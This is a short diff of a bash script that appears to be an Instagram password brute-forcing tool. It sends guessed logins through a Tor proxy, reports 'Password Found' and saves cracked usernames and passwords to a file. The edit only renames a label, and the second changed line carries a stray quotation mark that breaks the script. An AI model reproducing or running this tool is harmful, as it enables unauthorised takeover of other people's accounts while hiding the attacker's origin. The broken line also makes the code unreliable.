@@ -73,7 +73,7 @@ check=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.
 #echo $check
 if [[ "$check" == "200" ]]; then
 printf "\e[1;92m [*] Password Found: %s \n\e[0m" $pass
-printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
+printf "imjust_kmod: %s, Password: %s\n" $user $pass >> found.instashell
 printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
 exit 1
 fi
@@ -81,7 +81,7 @@ fi
 if [[ "$check" == "challenge" ]]; then
 printf "\e[1;92m [*] Password Found: %s\n" $pass
 printf "\e[1;92m [*] Challenge required\n"
-printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
+printf "imjust_kmod": %s, Password: %s\n" $user $pass >> found.instashell
 printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
 exit 1
 fi
